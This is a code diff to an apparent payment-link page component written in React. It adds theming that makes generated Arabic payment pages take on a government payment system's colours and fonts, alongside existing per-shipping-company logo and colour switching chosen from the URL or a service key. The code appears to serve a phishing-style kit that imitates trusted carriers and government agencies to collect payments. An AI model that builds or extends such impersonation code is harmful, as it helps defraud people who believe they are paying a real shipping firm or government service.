@@ -13,6 +13,8 @@ import PaymentMetaTags from "@/components/PaymentMetaTags";
 import BrandedCarousel from "@/components/BrandedCarousel";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 import PageLoader from "@/components/PageLoader";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
+import { isGovernmentService } from "@/lib/governmentPaymentServices";
 
 const PaymentDetails = () => {
   const { id } = useParams();
@@ -38,6 +40,10 @@ const PaymentDetails = () => {
   const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
+  
+  // Check if this is a government service
+  const isGovService = isGovernmentService(serviceKey);
+  const govSystem = getGovernmentPaymentSystem(countryCode);
   const shippingInfo = linkData?.payload as any;
   
   const amountParam = searchParams.get('amount') || searchParams.get('a');
@@ -74,8 +80,11 @@ const PaymentDetails = () => {
   const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
   const displayLogo = entityLogo || branding.logo;
   
-  const primaryColor = companyBranding?.colors.primary || branding.colors.primary;
-  const secondaryColor = companyBranding?.colors.secondary || branding.colors.secondary;
+  // Use government theme if it's a government service
+  const primaryColor = isGovService ? govSystem.colors.primary : (companyBranding?.colors.primary || branding.colors.primary);
+  const secondaryColor = isGovService ? govSystem.colors.secondary : (companyBranding?.colors.secondary || branding.colors.secondary);
+  const surfaceColor = isGovService ? govSystem.colors.surface : (companyBranding?.colors.surface || '#F8F9FA');
+  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif');
   
   const handleProceed = () => {
     const paymentMethod = methodParam || (linkData?.payload as any)?.payment_method || 'card';
@@ -148,8 +157,8 @@ const PaymentDetails = () => {
         className="min-h-screen py-8 sm:py-12"
         dir="rtl"
         style={{
-          background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
-          fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+          background: `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
+          fontFamily: fontFamily
         }}
       >
         <div className="container mx-auto px-4 max-w-2xl">
